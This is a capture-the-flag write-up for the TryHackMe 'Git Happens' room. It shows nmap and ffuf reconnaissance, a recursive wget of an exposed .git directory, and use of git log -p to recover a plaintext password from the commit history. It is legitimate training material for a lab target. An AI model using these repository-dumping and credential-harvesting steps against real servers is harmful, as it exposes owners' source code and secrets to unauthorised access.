```bash
# PLATFORM          . THM
# CTF NAME          . Git Happens
# DESCRIPTION       . Boss wanted me to create a prototype, so here it is! We even used something called "version control" that made deploying this really easy!
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/githappens
```

```bash
sudo nmap -sSVC -T5 -p- 10.10.13.187 -oN git
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.0 (Ubuntu)
| http-git: 
|   10.10.13.187:80/.git/
|     Git repository found!
|_    Repository description: Unnamed repository; edit this file 'description' to name the...
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Super Awesome Site!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Although `nmap` is able to find the `/.git/` directory by itself, this can also be seen / confirmed by running `ffuf` against the target.

```
ffuf -u http://10.10.13.187/FUZZ -w /usr/share/wordlists/dirb/common.txt -t 100
```

```
.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2]
```

- We can get the entire `.git` directory by either using [git-dumper](https://github.com/arthaud/git-dumper) or by using 

```
wget -r http://ip/.git > website
```

- Then, a simpel `ls -la` will confirm the existence of the `.git` directory

- We can use `git diff` and `git log -p` to see the differences in each commit ; I found the latter to provide more useful information in this exact scenario.

- Scrolling down, we find the hash of the password and some obfuscated code. But I went all the way down to check for additional info, and it seems that there's no need to complicate ourselves trying to read the code or to try and find out the password.

- The first commits contain the password in plaintext. Go and grab it :) 

